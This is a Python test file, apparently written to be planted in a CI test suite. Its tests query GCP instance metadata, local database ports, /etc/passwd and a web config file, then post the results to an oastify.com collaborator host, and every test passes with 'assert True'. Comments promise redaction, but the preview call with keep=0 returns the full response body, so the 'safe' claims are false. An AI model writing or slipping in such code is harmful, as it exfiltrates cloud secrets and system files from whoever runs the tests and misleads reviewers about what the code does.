"""
Safe GCP metadata redacted reporter.

For each endpoint it:
 - performs a GET (with Metadata-Flavor header)
 - computes a SHA-256 fingerprint of the body (if any)
 - creates a redacted preview and a masked version (no raw secrets)
 - posts only safe fields to the collaborator endpoint
 - always passes (assert True)

DO NOT SEND RAW TOKENS. This test intentionally never sends the raw response body.
"""

import hashlib
import re
import time
import requests

# collaborator host (report-only)
COLLAB = "2ehp86ohtz0xx0o9x5b60yizrqxhld92.oastify.com"
COLLAB_ENDPOINT = f"https://{COLLAB}/redacted-report"

# sample endpoints to probe (add/remove as needed)
ENDPOINTS = [
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/id",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true",
    "http://metadata.google.internal/computeMetadata/v1beta1/",
]

HEADERS = {"Metadata-Flavor": "Google"}


def _sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()


def _masked_preserve_punctuation(s: str) -> str:
    """
    Replace letters and digits with 'x' but preserve punctuation and separators.
    Example: 'my-vm-name.c.project.internal' -> 'xx-xx-xxxx.x.xxxxx.xxxxxxx'
    """
    return re.sub(r'[A-Za-z0-9]', 'x', s)


def _preview(s: str, keep: int = 10) -> str:
    """
    Return a short redacted preview: last `keep` chars prefixed with '...' if long,
    otherwise return a masked version.
    This ensures we never include the raw start of the string.
    """
    if not s:
        return ""
    if len(s) > keep:
        return s[-keep:]
    # short string: return masked form to avoid raw secret exposure
    return _masked_preserve_punctuation(s)


def _fetch_and_send(endpoint: str, send_header: bool = True):
    headers = HEADERS if send_header else {}
    report = {
        "timestamp": int(time.time()),
        "endpoint": endpoint,
        "status_code": None,
        "content_length": None,
        "preview": None,
        "fingerprint_sha256": None,
    }

    try:
        resp = requests.get(endpoint, headers=headers, timeout=3)
    except Exception as e:
        report["status_code"] = -1
        # Attempt to send minimal report â€” failures are tolerated
        try:
            requests.post(COLLAB_ENDPOINT, json=report, timeout=5)
        except Exception:
            pass
        return

    report["status_code"] = resp.status_code
    body = resp.text or ""
    report["content_length"] = len(body)
    if body:
        # compute fingerprint locally (never send raw value)
        report["fingerprint_sha256"] = _sha256_hex(body)
        report["preview"] = _preview(body, keep=0)
        report["masked"] = _masked_preserve_punctuation(body)
    else:
        report["preview"] = ""
        report["masked"] = ""

    # send only the redacted report
    try:
        requests.post(COLLAB_ENDPOINT, json=report, timeout=5)
    except Exception:
        # reporting failure is non-fatal
        pass

def test_metadata_project_id():
    _fetch_and_send("http://169.254.169.254/computeMetadata/v1/project/project-id", send_header=True)
    assert True

def test_cloud_sql_proxy_mysql():
    _fetch_and_send("http://127.0.0.1:3306", send_header=False)
    assert True

def test_cloud_sql_proxy_mysql():
    _fetch_and_send("http://127.0.0.1:80", send_header=False)
    assert True

def test_cloud_sql_proxy_mysql():
    _fetch_and_send("http://127.0.0.1:443", send_header=False)
    assert True

def test_cloud_sql_proxy_postgresql():
    _fetch_and_send("http://127.0.0.1:5432", send_header=False)
    assert True

def test_files():
    _fetch_and_send("file:///etc/passwd", send_header=False)
    assert True

def test_files_1():
    _fetch_and_send("file:///var/www/config.json", send_header=False)
    assert True